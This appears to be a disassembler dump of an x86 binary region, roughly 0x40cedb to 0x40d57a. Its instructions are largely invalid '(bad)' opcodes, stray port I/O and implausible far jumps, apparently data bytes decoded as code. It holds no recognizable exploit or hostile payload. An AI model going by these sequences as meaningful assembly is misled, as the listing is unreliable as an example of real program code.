  40cedb:	(bad)  
  40cedc:	(bad)  
  40cedd:	fistp  QWORD PTR [esi+0x73e54cff]
  40cee3:	dec    DWORD PTR [ebp+eiz*8+0x73]
  40cee7:	dec    DWORD PTR [ebp+eiz*8+0x73]
  40ceeb:	dec    DWORD PTR [ebp+eiz*8+0x73]
  40ceef:	jmp    DWORD PTR [esi]
  40cef1:	mov    edi,0x9900ff3a
  40cef6:	add    bh,bh
  40cef8:	jae    0x40cf6d
  40cefa:	dec    ebp
  40cefb:	jmp    esi
  40cefd:	mov    eax,0xd2ffffb8
  40cf02:	sar    bh,cl
  40cf04:	call   eax
  40cf06:	sar    bh,1
  40cf08:	dec    esp
  40cf0a:	int3   
  40cf0b:	(bad)  
  40cf0c:	dec    ebx
  40cf0e:	retf   
  40cf0f:	(bad)  
  40cf10:	inc    ebp
  40cf12:	(bad)  
  40cf15:	mov    esi,0xb9ffffbe
  40cf1a:	mov    ecx,0xececffff
  40cf1f:	(bad)  
  40cf20:	push   edx
  40cf22:	(bad)  
  40cf23:	(bad)  
  40cf24:	jmp    0x99406ac4
  40cf29:	outs   dx,DWORD PTR ds:[esi]
  40cf2a:	jo     0x40cf2b
  40cf2c:	test   eax,0xffffe5e4
  40cf31:	fistp  QWORD PTR [esi-0x67553601]
  40cf37:	call   FWORD PTR [edi-0x8008f90]
  40cf3d:	in     eax,dx
  40cf3e:	lock (bad) 
  40cf40:	(bad)  
  40cf41:	cli    
  40cf42:	(bad)  
  40cf43:	push   esi
  40cf45:	icebp  
  40cf46:	out    dx,eax
  40cf47:	(bad)  
  40cf48:	out    dx,eax
  40cf49:	in     eax,0xe3
  40cf4b:	(bad)  
  40cf4c:	out    dx,eax
  40cf4d:	in     eax,0xe3
  40cf4f:	(bad)  
  40cf50:	out    dx,eax
  40cf51:	in     eax,0xe3
  40cf53:	(bad)  
  40cf54:	out    dx,eax
  40cf55:	in     eax,0xe3
  40cf57:	(bad)  
  40cf58:	out    dx,eax
  40cf59:	in     eax,0xe3
  40cf5b:	(bad)  
  40cf5c:	out    dx,eax
  40cf5d:	in     eax,0xe3
  40cf5f:	(bad)  
  40cf60:	out    dx,eax
  40cf61:	in     eax,0xe3
  40cf63:	jmp    FWORD PTR [ecx+0x35ff7d7e]
  40cf69:	and    al,0x24
  40cf6b:	mov    eax,0x45000000
  40cf70:	add    BYTE PTR [eax],al
  40cf72:	add    BYTE PTR [eax],al
  40cf74:	(bad)  
  40cf75:	(bad)  
  40cf76:	inc    DWORD PTR [eax]
  40cf78:	imul   ebp,DWORD PTR [ebx+0x6b],0x48
  40cf7c:	scas   eax,DWORD PTR es:[edi]
  40cf7d:	scas   eax,DWORD PTR es:[edi]
  40cf7e:	scas   eax,DWORD PTR es:[edi]
  40cf7f:	jmp    ebp
  40cf81:	in     eax,0xe5
  40cf83:	jmp    esp
  40cf85:	in     al,0xe4
  40cf87:	jmp    edx
  40cf89:	loop   0x40cf6d
  40cf8b:	jmp    ecx
  40cf8d:	loope  0x40cf70
  40cf8f:	(bad)  
  40cf90:	call   0x40a674
  40cf95:	fdivr  QWORD PTR [ecx-0x46230001]
  40cf9b:	(bad)  
  40cf9c:	(bad)  
  40cf9d:	fdivr  QWORD PTR [ecx-0x7c0fa801]
  40cfa3:	call   DWORD PTR [edi-0x10]
  40cfa6:	cmp    edi,0x57
  40cfa9:	lock cmp edi,0x57
  40cfad:	lock cmp edi,0x2f
  40cfb1:	lds    edx,FWORD PTR [ecx-0x1]
  40cfb4:	and    BYTE PTR [eax+0x697cffa9],dl
  40cfba:	xchg   bh,bh
  40cfbc:	out    0xb3,al
  40cfbe:	mov    bl,0xff
  40cfc0:	dec    esp
  40cfc2:	int3   
  40cfc3:	(bad)  
  40cfc4:	dec    esp
  40cfc6:	int3   
  40cfc7:	(bad)  
  40cfc8:	dec    esp
  40cfca:	int3   
  40cfcb:	(bad)  
  40cfcc:	dec    esp
  40cfce:	int3   
  40cfcf:	(bad)  
  40cfd0:	dec    esp
  40cfd2:	int3   
  40cfd3:	(bad)  
  40cfd4:	dec    esp
  40cfd6:	int3   
  40cfd7:	(bad)  
  40cfd8:	dec    esp
  40cfda:	int3   
  40cfdb:	(bad)  
  40cfdc:	push   edx
  40cfde:	repnz (bad) 
  40cfe0:	push   edx
  40cfe2:	(bad)  
  40cfe3:	jmp    esi
  40cfe5:	lods   al,BYTE PTR ds:[esi]
  40cfe6:	lods   al,BYTE PTR ds:[esi]
  40cfe7:	call   DWORD PTR [esi-0x59007c80]
  40cfed:	jmp    0xffb9:0xdcffffee
  40cff4:	(bad)  
  40cff5:	fdivr  QWORD PTR [ecx+0x666699ff]
  40cffb:	(bad)  
  40cffc:	out    dx,al
  40cffd:	xlat   BYTE PTR ds:[ebx]
  40cffe:	(bad)  
  40cfff:	(bad)  
  40d000:	(bad)  
  40d001:	cli    
  40d002:	(bad)  
  40d003:	push   esp
  40d005:	in     eax,dx
  40d006:	in     al,dx
  40d007:	(bad)  
  40d008:	jmp    0xea40a8e9
  40d00d:	(bad)  
  40d00f:	(bad)  
  40d010:	jmp    0xea40a8f1
  40d015:	(bad)  
  40d017:	(bad)  
  40d018:	jmp    0xea40a8f9
  40d01d:	(bad)  
  40d01f:	(bad)  
  40d020:	jmp    0xae40a901
  40d025:	add    DWORD PTR [ebx+0x242435ff],0xffffffb8
  40d02c:	add    BYTE PTR [eax],al
  40d02e:	add    BYTE PTR [ebp+0x0],al
  40d031:	add    BYTE PTR [eax],al
  40d033:	add    bh,bh
  40d035:	(bad)  
  40d036:	inc    DWORD PTR [eax]
  40d038:	ins    BYTE PTR es:[edi],dx
  40d039:	ins    BYTE PTR es:[edi],dx
  40d03a:	ins    BYTE PTR es:[edi],dx
  40d03b:	dec    eax
  40d03c:	mov    al,0xb0
  40d03e:	mov    al,0xff
  40d040:	out    0xe6,al
  40d042:	out    0xff,al
  40d044:	in     eax,0xe5
  40d046:	in     eax,0xff
  40d048:	in     al,0xe4
  40d04a:	in     al,0xff
  40d04c:	loop   0x40d030
  40d04e:	loop   0x40d04f
  40d050:	jmp    0x40a734
  40d055:	fidiv  DWORD PTR [ebp-0x4a250001]
  40d05b:	(bad)  
  40d05c:	(bad)  
  40d05d:	fidiv  DWORD PTR [ebp-0x7007a001]
  40d063:	call   FWORD PTR [edi-0x8]
  40d066:	(bad)  
  40d067:	call   FWORD PTR [edi-0x8]
  40d06a:	(bad)  
  40d06b:	call   FWORD PTR [ebx-0x16]
  40d06e:	mov    ds:0xdbc54fff,al
  40d073:	push   DWORD PTR [eax]
  40d075:	nop
  40d076:	stc    
  40d077:	push   DWORD PTR [esi+0x69]
  40d07a:	xchg   bh,bh
  40d07c:	rcr    BYTE PTR [edi-0x33000061],cl
  40d082:	int3   
  40d083:	(bad)  
  40d084:	dec    esp
  40d086:	int3   
  40d087:	(bad)  
  40d088:	dec    esp
  40d08a:	int3   
  40d08b:	(bad)  
  40d08c:	dec    esp
  40d08e:	int3   
  40d08f:	(bad)  
  40d090:	dec    esp
  40d092:	int3   
  40d093:	(bad)  
  40d094:	dec    esp
  40d096:	int3   
  40d097:	(bad)  
  40d098:	dec    esp
  40d09a:	int3   
  40d09b:	(bad)  
  40d09c:	(bad)  
  40d09d:	out    dx,eax
  40d09e:	out    dx,eax
  40d09f:	(bad)  
  40d0a0:	push   edx
  40d0a2:	(bad)  
  40d0a3:	(bad)  
  40d0a4:	stc    
  40d0a5:	iret   
  40d0a6:	sar    bh,cl
  40d0a8:	lahf   
  40d0a9:	jo     0x40d11b
  40d0ab:	jmp    DWORD PTR [edi-0x2f32]
  40d0b1:	fidiv  DWORD PTR [ebp-0x593b1301]
  40d0b7:	call   FWORD PTR [ecx-0x999a]
  40d0bd:	mov    bl,0xb6
  40d0bf:	(bad)  
  40d0c0:	(bad)  
  40d0c1:	cli    
  40d0c2:	(bad)  
  40d0c3:	(bad)  
  40d0c4:	call   ebp
  40d0c6:	aad    0xff
  40d0c8:	push   DWORD PTR [eax-0x46030050]
  40d0ce:	mov    ecx,0xc0c1f9ff
  40d0d3:	(bad)  
  40d0d4:	stc    
  40d0d5:	mov    ch,0xff
  40d0d8:	stc    
  40d0d9:	retf   
  40d0da:	retf   0xf6ff
  40d0dd:	iret   
  40d0de:	int    0xff
  40d0e0:	repz aam 0xd2
  40d0e3:	jmp    FWORD PTR [edi+0x35ff8282]
  40d0e9:	and    al,0x24
  40d0eb:	mov    eax,0x45000000
  40d0f0:	add    BYTE PTR [eax],al
  40d0f2:	add    BYTE PTR [eax],al
  40d0f4:	(bad)  
  40d0f5:	(bad)  
  40d0f6:	inc    DWORD PTR [eax]
  40d0f8:	ins    DWORD PTR es:[edi],dx
  40d0f9:	ins    DWORD PTR es:[edi],dx
  40d0fa:	ins    DWORD PTR es:[edi],dx
  40d0fb:	dec    eax
  40d0fc:	mov    cl,0xb1
  40d0fe:	mov    cl,0xff
  40d100:	out    0xe7,eax
  40d102:	out    0xff,eax
  40d104:	out    0xe6,al
  40d106:	out    0xff,al
  40d108:	in     eax,0xe5
  40d10a:	in     eax,0xff
  40d10c:	in     al,0xe4
  40d10e:	in     al,0xff
  40d110:	jmp    0xb0d8:0xffffd6e0
  40d117:	(bad)  
  40d118:	(bad)  
  40d119:	fdiv   DWORD PTR [eax-0x4f270001]
  40d11f:	call   FWORD PTR [eax+ebp*8-0x4d]
  40d123:	call   DWORD PTR [ebp-0x2b]
  40d126:	int3   
  40d127:	dec    DWORD PTR [edi-0x42]
  40d12a:	in     al,dx
  40d12b:	dec    DWORD PTR [ebp-0x4d]
  40d12e:	(bad)  
  40d12f:	dec    DWORD PTR [ebp-0x4d]
  40d132:	(bad)  
  40d133:	push   DWORD PTR [eax]
  40d135:	nop
  40d136:	stc    
  40d137:	jmp    DWORD PTR [eax+0x6d]
  40d13a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d13b:	inc    esi
  40d13d:	xchg   ebx,eax
  40d13e:	xchg   ebx,eax
  40d13f:	(bad)  
  40d140:	dec    esp
  40d142:	int3   
  40d143:	(bad)  
  40d144:	dec    esp
  40d146:	int3   
  40d147:	(bad)  
  40d148:	dec    esp
  40d14a:	int3   
  40d14b:	(bad)  
  40d14c:	dec    esp
  40d14e:	int3   
  40d14f:	(bad)  
  40d150:	dec    esp
  40d152:	int3   
  40d153:	(bad)  
  40d154:	dec    esp
  40d156:	int3   
  40d157:	(bad)  
  40d158:	dec    edi
  40d15a:	iret   
  40d15b:	(bad)  
  40d15c:	(bad)  
  40d15d:	in     al,dx
  40d15e:	in     al,dx
  40d15f:	(bad)  
  40d160:	push   edx
  40d162:	(bad)  
  40d163:	(bad)  
  40d164:	push   eax
  40d166:	(bad)  
  40d167:	(bad)  
  40d168:	fld    st(6)
  40d16a:	(bad)  
  40d16b:	call   FWORD PTR [edi-0x4c009493]
  40d171:	cmp    DWORD PTR [ecx-0x1],0xffffff9f
  40d175:	ins    DWORD PTR es:[edi],dx
  40d176:	imul   edi,edi,0xffffffcc
  40d179:	add    BYTE PTR [eax-0x2d350001],0xff
  40d180:	(bad)  
  40d181:	cli    
  40d182:	(bad)  
  40d183:	(bad)  
  40d184:	inc    edi
  40d186:	(bad)  
  40d187:	(bad)  
  40d188:	jmp    FWORD PTR [edx-0x4f000056]
  40d18e:	mov    al,0xff
  40d190:	push   DWORD PTR [ebp-0x4500004b]
  40d196:	mov    edx,0xc0c0ffff
  40d19b:	(bad)  
  40d19c:	inc    edi
  40d19e:	(bad)  
  40d19f:	(bad)  
  40d1a0:	dec    ebx
  40d1a2:	retf   
  40d1a3:	push   DWORD PTR [ebx+0x36ff8181]
  40d1a9:	and    al,0x24
  40d1ab:	mov    dh,0x0
  40d1ad:	add    BYTE PTR [eax],al
  40d1af:	aas    
  40d1b0:	add    BYTE PTR [eax],al
  40d1b2:	add    BYTE PTR [eax],al
  40d1b4:	(bad)  
  40d1b5:	(bad)  
  40d1b6:	inc    DWORD PTR [eax]
  40d1b8:	ins    DWORD PTR es:[edi],dx
  40d1b9:	ins    DWORD PTR es:[edi],dx
  40d1ba:	ins    DWORD PTR es:[edi],dx
  40d1bb:	dec    eax
  40d1bc:	mov    dl,0xb2
  40d1be:	mov    dl,0xff
  40d1c0:	jmp    0xe840bbae
  40d1c5:	out    0xe7,eax
  40d1c7:	jmp    esi
  40d1c9:	out    0xe6,al
  40d1cb:	jmp    ebp
  40d1cd:	in     eax,0xe5
  40d1cf:	(bad)  
  40d1d0:	jmp    0x40d1b2
  40d1d2:	(bad)  
  40d1d3:	(bad)  
  40d1d4:	call   ebp
  40d1d6:	lods   al,BYTE PTR ds:[esi]
  40d1d7:	(bad)  
  40d1d8:	call   ebp
  40d1da:	lods   al,BYTE PTR ds:[esi]
  40d1db:	(bad)  
  40d1dc:	call   ebp
  40d1de:	lods   al,BYTE PTR ds:[esi]
  40d1df:	(bad)  
  40d1e0:	cmp    al,0xa2
  40d1e2:	(bad)  
  40d1e3:	inc    DWORD PTR [eax-0x5a]
  40d1e6:	(bad)  
  40d1e7:	inc    DWORD PTR [ebp-0x55]
  40d1ea:	(bad)  
  40d1eb:	dec    DWORD PTR [edx-0x50]
  40d1ee:	(bad)  
  40d1ef:	dec    DWORD PTR [ebp-0x4d]
  40d1f2:	(bad)  
  40d1f3:	push   DWORD PTR [edx]
  40d1f5:	xchg   ecx,eax
  40d1f6:	stc    
  40d1f7:	dec    DWORD PTR [esi+0x6e]
  40d1fa:	mov    ch,0xff
  40d1fc:	lods   al,BYTE PTR ds:[esi]
  40d1fd:	jns    0x40d278
  40d1ff:	(bad)  
  40d200:	dec    esp
  40d202:	int3   
  40d203:	(bad)  
  40d204:	dec    esp
  40d206:	int3   
  40d207:	(bad)  
  40d208:	dec    esp
  40d20a:	int3   
  40d20b:	(bad)  
  40d20c:	dec    esp
  40d20e:	int3   
  40d20f:	(bad)  
  40d210:	(bad)  
  40d211:	(bad)  
  40d213:	(bad)  
  40d214:	(bad)  
  40d215:	in     al,dx
  40d216:	in     al,dx
  40d217:	(bad)  
  40d218:	(bad)  
  40d219:	cld    
  40d21a:	cld    
  40d21b:	(bad)  
  40d21c:	(bad)  
  40d21d:	(bad)  
  40d21e:	(bad)  
  40d21f:	(bad)  
  40d220:	push   esp
  40d222:	(bad)  
  40d223:	(bad)  
  40d224:	jmp    ebp
  40d226:	(bad)  
  40d227:	(bad)  
  40d228:	(bad)  
  40d229:	out    dx,al
  40d22a:	(bad)  
  40d22b:	push   edx
  40d22d:	(bad)
  40d230:	(bad)  
  40d231:	mov    ecx,DWORD PTR [ebx-0x68681d01]
  40d237:	(bad)  
  40d238:	(bad)  
  40d239:	mov    edx,0xeeffffc4
  40d23e:	(bad)  
  40d23f:	(bad)  
  40d240:	push   esp
  40d242:	stc    
  40d243:	(bad)  
  40d244:	jmp    DWORD PTR [esp+eiz*4-0x5b5b0001]
  40d24b:	(bad)  
  40d24c:	jmp    FWORD PTR [edx-0x4f000056]
  40d252:	mov    al,0xff
  40d254:	push   DWORD PTR [ebp-0x4500004b]
  40d25a:	mov    edx,0xc0c0ffff
  40d25f:	(bad)  
  40d260:	inc    edi
  40d262:	(bad)  
  40d263:	jmp    DWORD PTR [ebx+0x38ff7272]
  40d269:	es es scas al,BYTE PTR es:[edi]
  40d26c:	add    BYTE PTR [eax],al
  40d26e:	add    BYTE PTR [esi],ch
  40d270:	add    BYTE PTR [eax],al
  40d272:	add    BYTE PTR [eax],al
  40d274:	(bad)  
  40d275:	(bad)  
  40d276:	inc    DWORD PTR [eax]
  40d278:	outs   dx,BYTE PTR ds:[esi]
  40d279:	outs   dx,BYTE PTR ds:[esi]
  40d27a:	outs   dx,BYTE PTR ds:[esi]
  40d27b:	dec    eax
  40d27c:	mov    ah,0xb4
  40d27e:	mov    ah,0xff
  40d280:	jmp    0xe9e9:0xe9ffeaea
  40d287:	jmp    edi
  40d289:	out    0xe7,eax
  40d28b:	jmp    esi
  40d28d:	out    0xe6,al
  40d28f:	(bad)  
  40d290:	jmp    0x40d272
  40d292:	aad    0xff
  40d294:	call   ebx
  40d296:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d297:	(bad)  
  40d298:	call   ebx
  40d29a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d29b:	(bad)  
  40d29c:	call   ebx
  40d29e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d29f:	(bad)  
  40d2a0:	cmp    DWORD PTR [edi-0x5dc30001],ebx
  40d2a6:	(bad)  
  40d2a7:	inc    DWORD PTR [eax-0x5a]
  40d2aa:	(bad)  
  40d2ab:	inc    DWORD PTR [ebp-0x55]
  40d2ae:	(bad)  
  40d2af:	dec    DWORD PTR [edx-0x50]
  40d2b2:	(bad)  
  40d2b3:	push   DWORD PTR [edi]
  40d2b5:	xchg   edi,eax
  40d2b6:	stc    
  40d2b7:	push   DWORD PTR [eax]
  40d2b9:	ins    DWORD PTR es:[edi],dx
  40d2ba:	sar    bh,cl
  40d2bc:	cdq    
  40d2bd:	data16 data16 (bad) 
  40d2c0:	stc    
  40d2c1:	mov    dh,0xff
  40d2c4:	call   edx
  40d2c6:	sar    bh,cl
  40d2c8:	(bad)  
  40d2c9:	jmp    0xfa40d2b7
  40d2ce:	stc    
  40d2cf:	(bad)  
  40d2d0:	(bad)  
  40d2d1:	(bad)  
  40d2d2:	(bad)  
  40d2d3:	(bad)  
  40d2d4:	(bad)  
  40d2d5:	(bad)  
  40d2d6:	(bad)  
  40d2d7:	(bad)  
  40d2d8:	(bad)  
  40d2d9:	(bad)  
  40d2da:	(bad)  
  40d2db:	(bad)  
  40d2dc:	(bad)  
  40d2dd:	(bad)  
  40d2de:	(bad)  
  40d2df:	(bad)  
  40d2e0:	(bad)  
  40d2e1:	std    
  40d2e2:	(bad)  
  40d2e3:	(bad)  
  40d2e4:	jmp    edi
  40d2e6:	(bad)  
  40d2e7:	(bad)  
  40d2e8:	(bad)  
  40d2e9:	fcos   
  40d2eb:	(bad)  
  40d2ec:	dec    ecx
  40d2ee:	cmc    
  40d2ef:	(bad)  
  40d2f0:	inc    esi
  40d2f2:	out    0xff,eax
  40d2f4:	call   eax
  40d2f6:	out    dx,eax
  40d2f7:	(bad)  
  40d2f8:	jmp    ebx
  40d2fa:	(bad)  
  40d2fb:	(bad)  
  40d2fc:	(bad)  
  40d2fd:	out    dx,al
  40d2fe:	(bad)  
  40d2ff:	(bad)  
  40d300:	(bad)  
  40d301:	mov    ebp,0x99ffffc0
  40d306:	cdq    
  40d307:	(bad)  
  40d308:	call   FWORD PTR [esi-0x5b000062]
  40d30e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d30f:	(bad)  
  40d310:	jmp    FWORD PTR [edx-0x4f000056]
  40d316:	mov    al,0xff
  40d318:	push   DWORD PTR [ebp-0x4500004b]
  40d31e:	mov    edx,0xbabaf5ff
  40d323:	call   FWORD PTR [ecx+0xff6666]
  40d329:	add    BYTE PTR [eax],al
  40d32b:	jg     0x40d32d
  40d32d:	add    BYTE PTR [eax],al
  40d32f:	and    al,BYTE PTR [eax]
  40d331:	add    BYTE PTR [eax],al
  40d333:	add    bh,bh
  40d335:	(bad)  
  40d336:	inc    DWORD PTR [eax]
  40d338:	outs   dx,DWORD PTR ds:[esi]
  40d339:	outs   dx,DWORD PTR ds:[esi]
  40d33a:	outs   dx,DWORD PTR ds:[esi]
  40d33b:	dec    eax
  40d33c:	mov    ch,0xb5
  40d33e:	mov    ch,0xff
  40d340:	jmp    0x40d32d
  40d342:	jmp    0x40d343
  40d344:	in     eax,dx
  40d345:	loopne 0x40d314
  40d347:	(bad)  
  40d348:	stc    
  40d349:	lods   eax,DWORD PTR ds:[esi]
  40d34a:	cmp    bh,bh
  40d34c:	in     al,dx
  40d34d:	shr    DWORD PTR [ebp-0x2a1e1301],cl
  40d353:	(bad)  
  40d354:	call   ecx
  40d356:	mov    ds:0xa2d1ffff,al
  40d35b:	(bad)  
  40d35c:	call   ecx
  40d35e:	mov    ds:0xdcaf81ff,al
  40d363:	call   FWORD PTR [esi-0x58]
  40d366:	out    dx,al
  40d367:	(bad)  
  40d368:	cmp    al,0xa2
  40d36a:	(bad)  
  40d36b:	inc    DWORD PTR [eax-0x5a]
  40d36e:	(bad)  
  40d36f:	inc    DWORD PTR [ebp-0x55]
  40d372:	(bad)  
  40d373:	(bad)  
  40d374:	cmp    al,0x9c
  40d376:	stc    
  40d377:	jmp    DWORD PTR [ebx]
  40d379:	imul   ebx,edi,0x79617bff
  40d37f:	call   edx
  40d381:	mov    dh,0xb6
  40d383:	(bad)  
  40d384:	(bad)  
  40d385:	(bad)  
  40d386:	(bad)  
  40d387:	(bad)  
  40d388:	(bad)  
  40d389:	(bad)  
  40d38a:	(bad)  
  40d38b:	(bad)  
  40d38c:	(bad)  
  40d38d:	(bad)  
  40d38e:	(bad)  
  40d38f:	(bad)  
  40d390:	(bad)  
  40d391:	(bad)  
  40d392:	(bad)  
  40d393:	(bad)  
  40d394:	(bad)  
  40d395:	(bad)  
  40d396:	(bad)  
  40d397:	(bad)  
  40d398:	(bad)  
  40d399:	(bad)  
  40d39a:	(bad)  
  40d39b:	(bad)  
  40d39c:	(bad)  
  40d39d:	(bad)  
  40d39e:	(bad)  
  40d39f:	(bad)  
  40d3a0:	(bad)  
  40d3a1:	(bad)  
  40d3a2:	(bad)  
  40d3a3:	(bad)  
  40d3a4:	(bad)  
  40d3a5:	cli    
  40d3a6:	(bad)  
  40d3a7:	(bad)  
  40d3a8:	(bad)  
  40d3a9:	(bad)  
  40d3ab:	(bad)  
  40d3ac:	dec    esp
  40d3ae:	(bad)  
  40d3af:	(bad)  
  40d3b0:	dec    edi
  40d3b2:	(bad)  
  40d3b3:	(bad)  
  40d3b4:	(bad)  
  40d3b5:	fcos   
  40d3b7:	(bad)  
  40d3b8:	(bad)  
  40d3b9:	fdivr  st(5),st
  40d3bb:	(bad)  
  40d3bc:	(bad)  
  40d3bd:	mov    esp,0xa1ffffc2
  40d3c2:	mov    eax,ds:0x9b9bffff
  40d3c7:	(bad)  
  40d3c8:	call   FWORD PTR [ecx-0x61000067]
  40d3ce:	sahf   
  40d3cf:	(bad)  
  40d3d0:	jmp    DWORD PTR [esp+eiz*4-0x55550001]
  40d3d7:	(bad)  
  40d3d8:	push   DWORD PTR [eax-0x4a000050]
  40d3de:	mov    ch,0xff
  40d3e0:	fcomp  QWORD PTR [edi+0x5885ff9f]
  40d3e6:	pop    eax
  40d3e7:	out    dx,eax
  40d3e8:	add    BYTE PTR [eax],al
  40d3ea:	add    BYTE PTR [ebx+0x0],ah
  40d3ed:	add    BYTE PTR [eax],al
  40d3ef:	push   ss
  40d3f0:	add    BYTE PTR [eax],al
  40d3f2:	add    BYTE PTR [eax],al
  40d3f4:	(bad)  
  40d3f5:	(bad)  
  40d3f6:	inc    DWORD PTR [eax]
  40d3f8:	jo     0x40d46a
  40d3fa:	jo     0x40d444
  40d3fc:	mov    dh,0xb6
  40d3fe:	mov    dh,0xff
  40d400:	repz shl DWORD PTR [ebx+0x99ffff],cl
  40d407:	push   edi
  40d409:	xchg   ecx,eax
  40d40a:	add    bh,bh
  40d40c:	jmp    0x40d3df
  40d40e:	scas   al,BYTE PTR es:[edi]
  40d40f:	(bad)  
  40d410:	in     eax,dx
  40d411:	loope  0x40d3e8
  40d413:	(bad)  
  40d414:	dec    esi
  40d416:	sahf   
  40d417:	(bad)  
  40d418:	dec    esi
  40d41a:	sahf   
  40d41b:	(bad)  
  40d41c:	dec    esi
  40d41e:	sahf   
  40d41f:	(bad)  
  40d420:	dec    esi
  40d422:	sahf   
  40d423:	(bad)  
  40d424:	dec    esi
  40d426:	sahf   
  40d427:	(bad)  
  40d428:	dec    esi
  40d42a:	sahf   
  40d42b:	dec    edi
  40d42d:	les    esi,FWORD PTR [esi-0x3d3f4601]
  40d433:	call   DWORD PTR [edx+0x5affd1b3]
  40d439:	jle    0x40d409
  40d43b:	inc    DWORD PTR [esi+0x56]
  40d43e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d43f:	jmp    DWORD PTR [esi-0x8687]
  40d445:	(bad)  
  40d446:	(bad)  
  40d447:	(bad)  
  40d448:	(bad)  
  40d449:	(bad)  
  40d44a:	(bad)  
  40d44b:	(bad)  
  40d44c:	(bad)  
  40d44d:	(bad)  
  40d44e:	(bad)  
  40d44f:	(bad)  
  40d450:	(bad)  
  40d451:	(bad)  
  40d452:	(bad)  
  40d453:	(bad)  
  40d454:	(bad)  
  40d455:	(bad)  
  40d456:	(bad)  
  40d457:	(bad)  
  40d458:	(bad)  
  40d459:	(bad)  
  40d45a:	(bad)  
  40d45b:	(bad)  
  40d45c:	(bad)  
  40d45d:	(bad)  
  40d45e:	(bad)  
  40d45f:	(bad)  
  40d460:	(bad)  
  40d461:	(bad)  
  40d462:	(bad)  
  40d463:	(bad)  
  40d464:	(bad)  
  40d465:	(bad)  
  40d466:	(bad)  
  40d467:	(bad)  
  40d468:	call   ebp
  40d46a:	aad    0xff
  40d46c:	inc    esi
  40d46e:	int3   
  40d46f:	(bad)  
  40d470:	inc    ebx
  40d472:	iret   
  40d473:	(bad)  
  40d474:	(bad)  
  40d475:	mov    edi,0xb3ffffc7
  40d47a:	mov    bl,0xff
  40d47c:	jmp    FWORD PTR [ebp-0x58000053]
  40d482:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d483:	(bad)  
  40d484:	jmp    DWORD PTR [ecx-0x6400005f]
  40d48a:	fwait
  40d48b:	(bad)  
  40d48c:	call   FWORD PTR [ecx-0x61000067]
  40d492:	sahf   
  40d493:	(bad)  
  40d494:	jmp    DWORD PTR [esp+eiz*4-0x55550001]
  40d49b:	(bad)  
  40d49c:	push   DWORD PTR [eax-0x7c400050]
  40d4a2:	cmp    edi,0x68
  40d4a5:	inc    esi
  40d4a6:	inc    esi
  40d4a7:	rol    BYTE PTR [eax],cl
  40d4a9:	add    BYTE PTR [eax],al
  40d4ab:	inc    eax
  40d4ac:	add    BYTE PTR [eax],al
  40d4ae:	add    BYTE PTR [edx],cl
  40d4b0:	add    BYTE PTR [eax],al
  40d4b2:	add    BYTE PTR [eax],al
  40d4b4:	(bad)  
  40d4b5:	(bad)  
  40d4b6:	inc    DWORD PTR [eax]
  40d4b8:	jb     0x40d52c
  40d4ba:	jb     0x40d504
  40d4bc:	mov    eax,0xf7ffb8b8
  40d4c1:	les    edi,FWORD PTR [eax-0x1]
  40d4c4:	not    DWORD PTR [ecx-0x77120100]
  40d4ca:	add    bh,bh
  40d4cc:	jmp    0xef4085a1
  40d4d1:	loop   0x40d4a8
  40d4d3:	(bad)  
  40d4d4:	dec    esp
  40d4d6:	cdq    
  40d4d7:	(bad)  
  40d4d8:	dec    esp
  40d4da:	cdq    
  40d4db:	(bad)  
  40d4dc:	dec    esp
  40d4de:	cdq    
  40d4df:	(bad)  
  40d4e0:	dec    esp
  40d4e2:	cdq    
  40d4e3:	(bad)  
  40d4e4:	dec    esp
  40d4e6:	cdq    
  40d4e7:	(bad)  
  40d4e8:	dec    esp
  40d4ea:	cdq    
  40d4eb:	(bad)  
  40d4ec:	dec    esp
  40d4ee:	cdq    
  40d4ef:	(bad)  
  40d4f0:	dec    esp
  40d4f2:	cdq    
  40d4f3:	(bad)  
  40d4f4:	dec    esp
  40d4f6:	cdq    
  40d4f7:	(bad)  
  40d4f8:	inc    ebp
  40d4fa:	cdq    
  40d4fb:	(bad)  
  40d4fc:	jmp    DWORD PTR [esi+0x6ea6ff99]
  40d502:	ins    BYTE PTR es:[edi],dx
  40d503:	(bad)  
  40d504:	fld    st(6)
  40d506:	(bad)  
  40d507:	(bad)  
  40d508:	(bad)  
  40d509:	(bad)  
  40d50a:	(bad)  
  40d50b:	(bad)  
  40d50c:	(bad)  
  40d50d:	(bad)  
  40d50e:	(bad)  
  40d50f:	(bad)  
  40d510:	(bad)  
  40d511:	(bad)  
  40d512:	(bad)  
  40d513:	(bad)  
  40d514:	(bad)  
  40d515:	(bad)  
  40d516:	(bad)  
  40d517:	(bad)  
  40d518:	(bad)  
  40d519:	(bad)  
  40d51a:	(bad)  
  40d51b:	(bad)  
  40d51c:	(bad)  
  40d51d:	(bad)  
  40d51e:	(bad)  
  40d51f:	(bad)  
  40d520:	(bad)  
  40d521:	(bad)  
  40d522:	(bad)  
  40d523:	(bad)  
  40d524:	push   esi
  40d526:	idiv   bh
  40d528:	dec    esp
  40d52a:	int3   
  40d52b:	(bad)  
  40d52c:	dec    ebx
  40d52e:	retf   
  40d52f:	(bad)  
  40d530:	inc    ebp
  40d532:	(bad)  
  40d535:	mov    esi,0xb9ffffbe
  40d53a:	mov    ecx,0xb3b3ffff
  40d53f:	(bad)  
  40d540:	jmp    FWORD PTR [ebp-0x58000053]
  40d546:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d547:	(bad)  
  40d548:	jmp    DWORD PTR [ecx-0x6400005f]
  40d54e:	fwait
  40d54f:	(bad)  
  40d550:	call   FWORD PTR [ecx-0x61000067]
  40d556:	sahf   
  40d557:	(bad)  
  40d558:	jmp    DWORD PTR [esp+eiz*4-0x5a5a0601]
  40d55f:	call   FWORD PTR [edi+0x34ff6b6b]
  40d565:	and    ah,BYTE PTR [edx]
  40d567:	pop    DWORD PTR [eax]
  40d569:	add    BYTE PTR [eax],al
  40d56b:	and    DWORD PTR [eax],eax
  40d56d:	add    BYTE PTR [eax],al
  40d56f:	add    al,BYTE PTR [eax]
  40d571:	add    BYTE PTR [eax],al
  40d573:	add    bh,bh
  40d575:	(bad)  
  40d576:	inc    DWORD PTR [eax]
  40d578:	jae    0x40d5ed
  40d57a:	jae    0x40d5c4
